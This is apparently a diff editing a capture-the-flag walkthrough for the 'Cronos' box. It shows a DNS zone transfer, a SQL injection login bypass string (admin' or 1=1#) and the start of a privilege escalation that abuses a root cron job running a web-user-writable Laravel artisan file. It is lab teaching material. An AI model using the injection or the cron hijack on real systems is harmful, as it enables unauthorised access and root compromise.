@@ -41,6 +41,7 @@ dig axfr @<IP> cronos.htb
 cronos.htb.       604800 IN A <IP>
 admin.cronos.htb. 604800 IN A <IP>
 www.cronos.htb.   604800 IN A <IP>
+ns1.cronos.htb.   604800 IN A <IP>
 ```
 
 ```bash
@@ -54,7 +55,7 @@ echo "<IP> cronos.htb admin.cronos.htb www.cronos.htb" | sudo tee -a /etc/hosts
 The login does not sanitise the query:
 
 ```text
-username: admin' or 1=1-- -
+username: admin' or 1=1#
 password: anything
 ```
 
@@ -88,6 +89,11 @@ cat /etc/crontab; ls -l /var/www/laravel/artisan
 ```text
 * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 -rwxr-xr-x 1 www-data www-data 1646 artisan
+```
+
+```bash
+php artisan -V
+# Laravel Framework 5.4.17
 ```
 
 `artisan` is Laravel's entrypoint and is owned by `www-data` (755), so the web user can rewrite it. Prepend a payload and let root's cron run it every minute:
